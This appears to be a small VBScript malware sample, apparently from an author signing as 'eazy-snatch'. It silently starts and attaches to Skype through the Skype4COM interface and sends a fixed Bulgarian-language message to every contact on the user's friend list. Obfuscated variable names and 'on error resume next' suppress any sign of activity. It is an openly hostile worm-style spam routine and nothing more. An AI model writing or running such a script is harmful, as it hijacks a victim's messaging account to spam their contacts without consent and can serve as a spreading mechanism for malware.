on error resume next
set NrrlP = WScript.CreateObject("Scripting.FileSystemObject")
set uDlVA = wscript.createobject("wscript.shell")
set yADAl = WScript.CreateObject("Skype4COM.Skype", "Skype_")
yADAl.Client.Start()
yADAl.Attach()
For Each GAG In yADAl.Friends
yADAl.SendMessage GAG.Handle, "Kakvo shte stane ako karate sas skorostta na svetlinata i vkluchish svetlinite.Taq glupost nqma otgovor prosto sabiram interesni idei ..Valentin Hristev a.k.a. eazy-snatch"
next